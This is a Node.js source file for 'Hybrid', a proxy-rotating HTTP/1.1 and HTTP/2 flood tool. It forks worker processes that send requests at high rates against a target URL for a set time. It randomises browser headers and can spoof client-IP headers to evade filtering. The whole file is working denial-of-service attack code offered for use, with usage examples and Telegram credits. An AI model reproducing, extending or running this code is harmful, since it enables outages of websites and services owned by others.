const net = require("net");
const http2 = require("http2");
const http = require("http");
const tls = require("tls");
const cluster = require("cluster");
const url = require("url");
const crypto = require("crypto");
const fs = require("fs");
const argv = require('minimist')(process.argv.slice(2));
const colors = require("colors");

process.setMaxListeners(0);
require("events").EventEmitter.defaultMaxListeners = 0;

const secureOptions = crypto.constants.SSL_OP_NO_SSLv2 |
    crypto.constants.SSL_OP_NO_SSLv3 |
    crypto.constants.SSL_OP_NO_TLSv1 |
    crypto.constants.SSL_OP_NO_TLSv1_1 |
    crypto.constants.ALPN_ENABLED |
    crypto.constants.SSL_OP_ALLOW_UNSAFE_LEGACY_RENEGOTIATION |
    crypto.constants.SSL_OP_CIPHER_SERVER_PREFERENCE |
    crypto.constants.SSL_OP_LEGACY_SERVER_CONNECT |
    crypto.constants.SSL_OP_COOKIE_EXCHANGE |
    crypto.constants.SSL_OP_PKCS1_CHECK_1 |
    crypto.constants.SSL_OP_PKCS1_CHECK_2 |
    crypto.constants.SSL_OP_SINGLE_DH_USE |
    crypto.constants.SSL_OP_SINGLE_ECDH_USE |
    crypto.constants.SSL_OP_NO_SESSION_RESUMPTION_ON_RENEGOTIATION;

const ciphers = `ECDHE-ECDSA-AES128-GCM-SHA256:ECDHE-ECDSA-AES256-GCM-SHA384:ECDHE-ECDSA-CHACHA20-POLY1305-SHA256:ECDHE-ECDSA-ECDHE-ECDSA-WITH-AES128-GCM-SHA256:ECDHE-ECDSA-ECDHE-RSA-WITH-AES128-GCM-SHA256:ECDHE-ECDSA-ECDHE-ECDSA-WITH-AES256-GCM-SHA384:ECDHE-ECDSA-ECDHE-RSA-WITH-AES256-GCM-SHA384:ECDHE-ECDSA-ECDHE-ECDSA-WITH-CHACHA20-POLY1305-SHA256:ECDHE-ECDSA-ECDHE-RSA-WITH-CHACHA20-POLY1305-SHA256:ECDHE-ECDSA-ECDHE-RSA-WITH-AES128-CBC-SHA:ECDHE-ECDSA-ECDHE-RSA-WITH-AES256-CBC-SHA:ECDHE-ECDSA-RSA-WITH-AES128-GCM-SHA256:ECDHE-ECDSA-RSA-WITH-AES256-GCM-SHA384:ECDHE-ECDSA-RSA-WITH-AES128-CBC-SHA:ECDHE-ECDSA-RSA-WITH-AES256-CBC-SHA`;
const sigalgs = `ecdsa_secp256r1_sha256:rsa_pss_rsae_sha256:rsa_pkcs1_sha256:ecdsa_secp384r1_sha384:rsa_pss_rsae_sha384:rsa_pkcs1_sha384:rsa_pss_rsae_sha512:rsa_pkcs1_sha512`;
this.ecdhCurve = `GREASE:x25519:secp256r1:secp384r1`;
this._sigalgs = sigalgs;

const secureContextOptions = {
    ciphers: ciphers,
    sigalgs: this._sigalgs,
    honorCipherOrder: true,
    secureOptions: secureOptions,
    secureProtocol: "TLS_client_method",
};
const secureContext = tls.createSecureContext(secureContextOptions);

const headers = {};
function readLines(filePath) {
    return fs.readFileSync(filePath, "utf-8").toString().split(/\r?\n/);
}

function randomIntn(min, max) {
    return Math.floor(Math.random() * (max - min) + min);
}

function randomElement(elements) {
    return elements[randomIntn(0, elements.length)];
}

function randstr(length) {
    const characters =
        "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789";
    let result = "";
    const charactersLength = characters.length;
    for (let i = 0; i < length; i++) {
        result += characters.charAt(Math.floor(Math.random() * charactersLength));
    }
    return result;
}


function getRandomPrivateIP() {
    const privateIPRanges = [
        "10.0.0.0/8",
        "172.16.0.0/12",
        "192.168.0.0/16"
    ];

    const randomIPRange = privateIPRanges[Math.floor(Math.random() * privateIPRanges.length)];

    const ipParts = randomIPRange.split("/");
    const ipPrefix = ipParts[0].split(".");
    const subnetMask = parseInt(ipParts[1], 10);
    for (let i = 0; i < 4; i++) {
        if (subnetMask >= 8) {
            ipPrefix[i] = Math.floor(Math.random() * 256);

        } else if (subnetMask > 0) {
            const remainingBits = 8 - subnetMask;
            const randomBits = Math.floor(Math.random() * (1 << remainingBits));
            ipPrefix[i] &= ~(255 >> subnetMask);
            ipPrefix[i] |= randomBits;
            subnetMask -= remainingBits;
        } else {
            ipPrefix[i] = 0;
        }
    }

    return ipPrefix.join(".");
}


function log(string) {
    let d = new Date();
    let hours = (d.getHours() < 10 ? '0' : '') + d.getHours();
    let minutes = (d.getMinutes() < 10 ? '0' : '') + d.getMinutes();
    let seconds = (d.getSeconds() < 10 ? '0' : '') + d.getSeconds();

    if (string.includes('\n')) {
        const lines = string.split('\n');

        lines.forEach(line => {
            console.log(`[${hours}:${minutes}:${seconds}]`.white + ` ${line}`);
        });
    } else {
        console.log(`[${hours}:${minutes}:${seconds}]`.white + ` ${string}`);
    }
}


function parseCommandLineArgs(args) {
    const parsedArgs = {};
    let currentFlag = null;

    for (const arg of args) {
        if (arg.startsWith('-')) {
            currentFlag = arg.slice(1);
            parsedArgs[currentFlag] = true;
        } else if (currentFlag) {
            parsedArgs[currentFlag] = arg;
            currentFlag = null;
        }
    }

    return parsedArgs;
}

const _argv = process.argv.slice(2);
const argz = parseCommandLineArgs(_argv);

function parseHLineArgs(args) {
    const parsedArgs = {};
    const headers = {};

    for (let i = 0; i < args.length; i++) {
        const arg = args[i];

        if (arg.startsWith('-h')) {
            if (i + 1 < args.length && args[i + 1].includes('@')) {
                const [headerName, headerValue] = args[i + 1].split('@');
                const parsedValue = replaceRandPlaceholder(headerValue);
                headers[headerName] = parsedValue;
                i++;
            }
        } else if (arg.startsWith('-')) {
            const currentFlag = arg.slice(1);
            parsedArgs[currentFlag] = true;
        } else if (arg.startsWith('--')) {
            const currentFlag = arg.slice(2);
            if (i + 1 < args.length && !args[i + 1].startsWith('-')) {
                parsedArgs[currentFlag] = args[i + 1];
                i++; // Skip the flag value
            } else {
                parsedArgs[currentFlag] = true;
            }
        }
    }

    return { args: parsedArgs, headers };
}

function replaceRandPlaceholder(value) {
    return value.replace(/%RAND-(\d+)%/g, (match, num) => randstr(parseInt(num)));
}


const _argh = process.argv.slice(2);
const { args: argh, headers: parsedHeaders } = parseHLineArgs(_argh);

class Messages {
    Alert() {
        log('Hybrid [ v1.0.2 ]')
        log('Credits - t.me/ardflood, t.me/shesh3n777rus, t.me/sentryapi')
        log('===========================================================')
    }
}

const messages = new Messages();

if (process.argv.length < 7) {
    messages.Alert()
    // --------------------------
    log('Usage: <url> <time> <threads> <rate> <proxy>')
    // --------------------------
    log('Arguments -')
    log(' -d <int any> [ delay before start new stream ]')
    log(' -v <int 1/2> [ http version ]')
    log(' -s [ use rate headers ]')
    log(' -e [ use extra headers ]')
    // --------------------------
    log('Settings -')
    log(' --log <text> [ enable log ] - code for log or nothing for all')
    log(' --debug [ enable debug ]')
    log(' --payload <text> [ send payload ] - %RAND% for random or')
    log('                                     %BYTES% for random bytes')
    log(' --query <text> [ querystring ] - %RAND% for random or')
    log('                                  custom: n=v&n2=v2')
    // --------------------------
    log('Headers -')
    log(' -h <header@value> [ adding header ]')
    log(' %RAND-<NUM>% [ generates a random string of a certain length ]')
    // --------------------------
    log('Examples -')
    log(' ./hybrid https://localhost.com 120 20 64 proxy.txt')
    log(' ./hybrid https://localhost.com 120 20 64 proxy.txt -d 30 -s -e')
    log(' ./hybrid https://localhost.com 120 20 64 proxy.txt --query %RAND% --log 200')
    log(' ./hybrid https://localhost.com 120 20 64 proxy.txt -h user-agent@test_ua -h accept@*/*')
    log(' ./hybrid https://localhost.com 120 20 64 proxy.txt -h user-agent@"Mozilla %RAND-16%"')
    process.exit();
}

const args = {
    target: process.argv[2],
    time: parseInt(process.argv[3]),
    rate: parseInt(process.argv[5]),
    threads: parseInt(process.argv[4]),
    proxyFile: process.argv[6],
}

const delay = parseInt(argz["d"]) || 0;
const version = parseInt(argz["v"]) || 2;
const spoof = argz["s"];
const extra = argz["e"];

const _log = argv["log"];
const debug = argv["debug"];
const query = argv["query"];
const payload = argv["payload"];

const errorHandler = error => {
    if (debug) {
        console.log(error);
    }
};

process.on("uncaughtException", errorHandler);
process.on("unhandledRejection", errorHandler);

const cplist = [
    "ECDHE-ECDSA-AES128-GCM-SHA256",
    "ECDHE-ECDSA-CHACHA20-POLY1305",
    "ECDHE-RSA-AES128-GCM-SHA256",
    "ECDHE-RSA-CHACHA20-POLY1305",
    "ECDHE-ECDSA-AES256-GCM-SHA384",
    "ECDHE-RSA-AES256-GCM-SHA384"
];

var cipper = cplist[Math.floor(Math.floor(Math.random() * cplist.length))];
var proxies = readLines(args.proxyFile);
const parsedTarget = url.parse(args.target);


const headerBuilder = {
    userAgent: [
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 13_3_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/111.0.0.0 Safari/537.36",
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Safari/537.36",
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.0.0 Safari/537.36",
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36",
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.0.0 Safari/537.36",
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36",
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.0.0 Safari/537.36",
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Safari/537.36",
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/111.0.0.0 Safari/537.36",
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.0.0 Safari/537.36",
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.0.0 Safari/537.36",
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36",
        "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Safari/537.36 Edge/12.0",
        "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.0.0 Safari/537.36 Edge/12.0",
        "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Safari/537.36",
        "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.0.0 Safari/537.36",
        "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36",
        "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.0.0 Safari/537.36",
        "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/111.0.0.0 Safari/537.36 Edge/12.0",
        "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.0.0 Safari/537.36 Edge/12.0",
        "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.0.0 Safari/537.36 Edge/12.0",
        "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Safari/537.36",
        "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/111.0.0.0 Safari/537.36",
        "Mozilla/5.0 (Windows NT 6.3; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.0.0 Safari/537.36",
        "Mozilla/5.0 (Windows NT 6.3; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Safari/537.36",
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Safari/537.36",
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.0.0 Safari/537.36",
        "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.0.0 Safari/537.36",
        "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.0.0 Safari/537.36",
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 13_5_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Safari/537.36",
        "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36 Edge/12.0",
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 13_5_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.0.0 Safari/537.36",
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 13_5_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36",
        "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36 Edge/12.0",
        "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.0.0 Safari/537.36 Edge/12.0",
        "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36",
        "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.0.0 Safari/537.36 Edge/12.0",
    ],

    acceptLang: [
        'ko-KR',
        'en-US',
        'zh-CN',
        'zh-TW',
        'ja-JP',
        'en-GB',
        'en-AU',
        'en-GB,en-US;q=0.9,en;q=0.8',
        'en-GB,en;q=0.5',
        'en-CA',
        'en-UK, en, de;q=0.5',
        'en-NZ',
        'en-GB,en;q=0.6',
        'en-ZA',
        'en-IN',
        'en-PH',
        'en-SG',
        'en-HK',
        'en-GB,en;q=0.8',
        'en-GB,en;q=0.9',
        'en-GB,en;q=0.7',
    ],

    acceptEncoding: [
        'gzip, deflate, br',
        'gzip, br',
        'deflate',
        'gzip, deflate, lzma, sdch',
        'deflate'
    ],

    accept: [
        'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8',
        'image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.8',
        'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
        'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8',
        'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
        'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3',
        'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
        'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8',
        'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
        'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3',
    ],

    Sec: {
        dest: ['image', 'media', 'worker'],
        site: ['none',],
        mode: ['navigate', 'no-cors']
    },

    Custom: {
        dnt: ['0', '1'],
        ect: ['3g', '2g', '4g'],
        downlink: ['0', '0.5', '1', '1.7'],
        rtt: ['510', '255'],
        devicememory: ['8', '1', '6', '4', '16', '32'],
        te: ['trailers', 'gzip'],
        version: ['Win64; x64', 'Win32; x32']
    }
}

const httpStatusCodes = {
    "200": { "Description": "OK", "Color": "brightGreen" },
    "301": { "Description": "Moved Permanently", "Color": "yellow" },
    "302": { "Description": "Found", "Color": "yellow" },
    "304": { "Description": "Not Modified", "Color": "yellow" },
    "400": { "Description": "Bad Request", "Color": "red" },
    "401": { "Description": "Unauthorized", "Color": "red" },
    "403": { "Description": "Forbidden", "Color": "red" },
    "404": { "Description": "Found", "Color": "red" },
    "500": { "Description": "Internal Server Error", "Color": "brightRed" },
    "502": { "Description": "Bad Gateway", "Color": "brightRed" },
    "503": { "Description": "Service Unavailable", "Color": "brightRed" }
};


class NetSocket {
    constructor() { }

    HTTP(options, callback) {
        const parsedAddr = options.address.split(":");
        const addrHost = parsedAddr[0];
        const payload = "CONNECT " + options.address + ":443 HTTP/1.1\r\nHost: " + options.address + ":443\r\nConnection: Keep-Alive\r\n\r\n";
        const buffer = new Buffer.from(payload);

        const connection = net.connect({
            host: options.host,
            port: options.port
        });

        connection.setTimeout(options.timeout * 600000);
        connection.setKeepAlive(true, 100000);

        connection.on("connect", () => {
            connection.write(buffer);
        });

        connection.on("data", chunk => {
            const response = chunk.toString("utf-8");
            const isAlive = response.includes("HTTP/1.1 200");
            if (isAlive === false) {
                connection.destroy();
                return callback(undefined, "error: invalid response from proxy server");
            }
            return callback(connection, undefined);
        });

        connection.on("timeout", () => {
            connection.destroy();
            return callback(undefined, "error: timeout exceeded");
        });

        connection.on("error", error => {
            connection.destroy();
            return callback(undefined, "error: " + error);
        });
    }
}

const Socker = new NetSocket();

function generateSpoofedFingerprint(userAgent, acceptLanguage) {
    const platform = 'Win64';
    const plugins = [
        { name: 'Chrome PDF Plugin', filename: 'internal-pdf-viewer' },
        { name: 'Chrome PDF Viewer', filename: 'mhjfbmdgcfjbbpaeojofohoefgiehjai' },
        { name: 'Google Translate', filename: 'aapbdbdomjkkjkaonfhkkikfgjllcleb' },
        { name: 'Zoom Chrome Extension', filename: 'kgjfgplpablkjnlkjmjdecgdpfankdle' },
        { name: 'uBlock Origin', filename: 'cjpalhdlnbpafiamejdnhcphjbkeiagm' },
        { name: 'AdBlock', filename: 'gighmmpiobklfepjocnamgkkbiglidom' },
        // etc ....
    ];

    const numPlugins = randomIntn(2, 5);
    const selectedPlugins = [];

    for (let i = 0; i < numPlugins; i++) {
        const randomIndex = randomIntn(0, plugins.length - 1);
        selectedPlugins.push(plugins[randomIndex]);
    }

    const fingerprintString = `${userAgent}${acceptLanguage}${platform}${JSON.stringify(selectedPlugins)}`;
    const sha256Fingerprint = crypto.createHash('sha256').update(fingerprintString).digest('hex');

    return sha256Fingerprint;
}


function http2run() {
    const proxyAddr = randomElement(proxies);
    const parsedProxy = proxyAddr.split(":");

    const selectedUserAgent = randomElement(headerBuilder.userAgent); //`Mozilla/5.0 (Windows NT 10.0; ${randomElement(headerBuilder.Custom.version)}) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/${randomIntn(104, 116)}.0.0.0 Safari/537.36`; // randomElement(headerBuilder.userAgent)
    const selectedLanguage = randomElement(headerBuilder.acceptLang); //`Mozilla/5.0 (Windows NT 10.0; ${randomElement(headerBuilder.Custom.version)}) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/${randomIntn(105, 116)}.0.0.0 Safari/537.36`;

    // STATIC
    headers[":method"] = "GET";
    headers[":authority"] = parsedTarget.host;
    headers[":scheme"] = "https";
    headers["x-forwarded-proto"] = "https";
    headers["upgrade-insecure-requests"] = "1";
    headers["sec-fetch-user"] = "?1";
    headers["x-requested-with"] = "XMLHttpRequest";


    // DYNAMIC
    if (query === '%RAND%') {
        headers[":path"] = parsedTarget.path + "?" + randstr(5) + "=" + randstr(25);
    } else if (!query) {
        headers[":path"] = parsedTarget.path;
    } else {
        headers[":path"] = parsedTarget.path + "?" + query;
    }

    headers["user-agent"] = selectedUserAgent;
    headers["sec-fetch-dest"] = randomElement(headerBuilder.Sec.dest);
    headers["sec-fetch-mode"] = randomElement(headerBuilder.Sec.mode);
    headers["sec-fetch-site"] = "none";
    headers["accept"] = randomElement(headerBuilder.accept);
    headers["accept-language"] = selectedLanguage;
    headers["accept-encoding"] = randomElement(headerBuilder.acceptEncoding);

    // EXTRA
    if (extra) {
        headers["DNT"] = randomElement(headerBuilder.Custom.dnt);
        headers["RTT"] = randomElement(headerBuilder.Custom.rtt);
        headers["Downlink"] = randomElement(headerBuilder.Custom.downlink);
        headers["Device-Memory"] = randomElement(headerBuilder.Custom.devicememory);
        headers["Ect"] = randomElement(headerBuilder.Custom.ect);
        headers["TE"] = randomElement(headerBuilder.Custom.te);

        headers["DPR"] = "2.0";
        headers["Service-Worker-Navigation-Preload"] = "true";
        headers["sec-ch-ua-arch"] = "x86";
        headers["sec-ch-ua-bitness"] = "64";
    }

    // SPOOF
    if (spoof) {
        headers["X-Real-Client-IP"] = getRandomPrivateIP();
        headers["X-Real-IP"] = getRandomPrivateIP();
        headers["X-Remote-Addr"] = getRandomPrivateIP();
        headers["X-Remote-IP"] = getRandomPrivateIP();
        headers["X-Forwarder"] = getRandomPrivateIP();
        headers["X-Forwarder-For"] = getRandomPrivateIP();
        headers["X-Forwarder-Host"] = getRandomPrivateIP();
        headers["X-Forwarding"] = getRandomPrivateIP();
        headers["X-Forwarding-For"] = getRandomPrivateIP();
        headers["Forwarded"] = getRandomPrivateIP();
        headers["Forwarded-For"] = getRandomPrivateIP();
        headers["Forwarded-Host"] = getRandomPrivateIP();
    }

    const proxyOptions = {
        host: parsedProxy[0],
        port: ~~parsedProxy[1],
        address: parsedTarget.host + ":443",
        timeout: 100,
    };

    Socker.HTTP(proxyOptions, (connection, error) => {
        if (error) return

        connection.setKeepAlive(true, 600000);

        const tlsOptions = {
            secure: true,
            ALPNProtocols: ['h2'],
            socket: connection,
            //secureOptions: secureOptions,
            minVersion: 'TLSv1.2',
            //ciphers: ciphers,
            //sigalgs: this._sigalgs,
            //ecdhCurve: this.ecdhCurve,
            host: parsedTarget.host,
            rejectUnauthorized: false,
            servername: parsedTarget.host,
            //fingerprint: generatedFP,
            //secureProtocol: "TLS_client_method",
            //secureContext: secureContext,
        };

        const tlsConn = tls.connect(443, parsedTarget.host, tlsOptions);

        tlsConn.setKeepAlive(true, 60000);

        const client = http2.connect(parsedTarget.href, {
            protocol: "https:",
            settings: {
                headerTableSize: 65536,
                maxConcurrentStreams: 10000,
                initialWindowSize: 65535,
                maxHeaderListSize: 65536,
                enablePush: false
            },
            maxSessionMemory: 64000,
            maxDeflateDynamicTableSize: 4294967295,
            createConnection: () => tlsConn,
            socket: connection,
        });

        client.settings({
            headerTableSize: 65536,
            maxConcurrentStreams: 10000,
            initialWindowSize: 6291456,
            maxHeaderListSize: 65536,
            enablePush: false
        });

        client.on("connect", () => {
            setInterval(() => {
                for (let i = 0; i < args.rate; i++) {
                    let dynHeaders = {}

                    if (Object.keys(parsedHeaders).length !== 0) {
                        let dynPath;

                        if (query === '%RAND%') {
                            dynPath = parsedTarget.path + "?" + randstr(5) + "=" + randstr(25);
                        } else if (!query) {
                            dynPath = parsedTarget.path;
                        } else {
                            dynPath = parsedTarget.path + "?" + query;
                        }

                        dynHeaders = {
                            ":method": "GET",
                            ":authority": parsedTarget.host,
                            ":scheme": "https",
                            ":path": dynPath,
                            ...parsedHeaders
                        };

                    } else {
                        dynHeaders = {
                            ...headers
                        };
                    }

                    const request = client.request(dynHeaders)

                        .on("response", response => {
                            const statusCode = response[':status'];

                            if (_log) {
                                const description = httpStatusCodes[statusCode].Description[httpStatusCodes[statusCode].Color];

                                if (_log === true) {
                                    if (httpStatusCodes[statusCode]) {
                                        log(`${statusCode} ${description}`)
                                    }
                                } else {
                                    if (httpStatusCodes[statusCode] && statusCode === parseInt(_log)) {
                                        log(`${statusCode} ${description}`)
                                    }
                                }
                            }


                            if (payload === '%RAND%') {
                                request.write(randstr(25));
                            } else if (!payload) { } else if (payload === '%BYTES%') {
                                request.end();
                                request.write(crypto.randomBytes(64));
                            } else {
                                request.end();
                                request.write(payload);
                            }

                            request.close();
                            request.destroy();
                            return
                        });

                    request.end();
                }
            }, 1000)
        });

        client.on("close", () => {
            client.destroy();
            connection.destroy();
            return
        });
    }), function (error, response, body) { };
}


function http1run() {
    var proxy = proxies[Math.floor(Math.random() * proxies.length)];
    proxy = proxy.split(':');

    var req = http.request({
        host: proxy[0],
        port: proxy[1],
        ciphers: cipper,
        method: 'CONNECT',
        path: parsedTarget.host + ":443"
    }, (err) => {
        req.end();
        return;
    })

    var queryString;

    if (query === '%RAND%') {
        queryString = parsedTarget.path + "?" + randstr(5) + "=" + randstr(25);
    } else if (!query) {
        queryString = parsedTarget.path;
    } else {
        queryString = parsedTarget.path + "?" + query;
    }

    req.on('connect', function (res, socket, head) {
        var tlsConnection = tls.connect({
            host: parsedTarget.host,
            ciphers: cipper,
            secureProtocol: 'TLS_method',
            servername: parsedTarget.host,
            secure: true,
            rejectUnauthorized: false,
            socket: socket
        }, function () {
            setInterval(() => {
                for (let j = 0; j < args.rate; j++) {
                    let headers = "GET " + queryString + " HTTP/1.1\r\n" +
                        "Host: " + parsedTarget.host + "\r\n" +
                        "Referer: " + args.target + "\r\n" +
                        "Origin: " + args.target + "\r\n" +
                        `Accept: ${randomElement(headerBuilder.accept)}\r\n` +
                        "User-Agent: " + randomElement(headerBuilder.userAgent) + "\r\n" +
                        "Upgrade-Insecure-Requests: 1\r\n" +
                        `Accept-Encoding: ${randomElement(headerBuilder.acceptEncoding)}\r\n` +
                        `Accept-Language: ${randomElement(headerBuilder.acceptLang)}\r\n` +
                        "Cache-Control: max-age=0\r\n" +
                        "Connection: Keep-Alive\r\n";

                    if (spoof) {
                        headers += `X-Forwarding-For: ${getRandomPrivateIP()}\r\n`;
                    }

                    headers += `\r\n`;


                    function convertToHttp1Headers(parsedHeaders) {
                        let http1Headers = '';
                        for (const headerName in parsedHeaders) {
                            http1Headers += `${headerName}: ${parsedHeaders[headerName]}\r\n`;
                        }
                        http1Headers += "\r\n";
                        return http1Headers;
                    }

                    let dynHeaders;

                    if (Object.keys(parsedHeaders).length !== 0) {
                        const http1HeadersString = convertToHttp1Headers(parsedHeaders);

                        dynHeaders = "GET " + queryString + " HTTP/1.1\r\n";
                        dynHeaders += "Host: " + parsedTarget.host + "\r\n"
                        dynHeaders += "Connection: keep-alive\r\n"
                        dynHeaders += http1HeadersString;
                        dynHeaders += "\r\n";

                    } else {
                        dynHeaders = headers;
                    }

                    tlsConnection.write(dynHeaders);
                }
            })
        })

        tlsConnection.on('error', function (data) {
            tlsConnection.end();
            tlsConnection.destroy();
        })

        tlsConnection.on("data", (chunk) => {
            const responseLines = chunk.toString().split('\r\n');
            const firstLine = responseLines[0];
            const statusCode = parseInt(firstLine.split(' ')[1], 10);

            if (_log) {
                const description = httpStatusCodes[statusCode].Description[httpStatusCodes[statusCode].Color];
                if (_log === true) {
                    if (httpStatusCodes[statusCode]) {
                        log(`${statusCode} ${description}`)
                    }
                } else {
                    if (httpStatusCodes[statusCode] && statusCode === parseInt(_log)) {
                        log(`${statusCode} ${description}`)
                    }
                }
            }

            delete chunk;
            setTimeout(function () {
                return delete tlsConnection;
            }, 10000);
        })
    })

    req.end();
}


if (cluster.isPrimary) {
    messages.Alert()

    if (version !== 1 && version !== 2) {
        log("ERROR".red + "  " + `Invalid HTTP version. Available: 1, 2`)
        process.exit()
    }

    if (typeof delay !== 'number' && delay < 1) {
        log("ERROR".red + "  " + `Cannot parse delay.`)
        process.exit()
    }

    log("INFO".cyan + "  " + `Attack ${args.target} started.`.white);
    for (let i = 0; i < args.threads; i++) {
        cluster.fork()
    }

    setTimeout(() => {
        log("INFO".cyan + "  " + `Attack is over.`.white);
        process.exit(1);
    }, args.time * 1000);

} else {
    if (version === 2) {
        setInterval(() => { http2run() }, Number(delay) * 1000)
    } else if (version === 1) {
        setInterval(() => { http1run() }, Number(delay) * 1000)
    }
}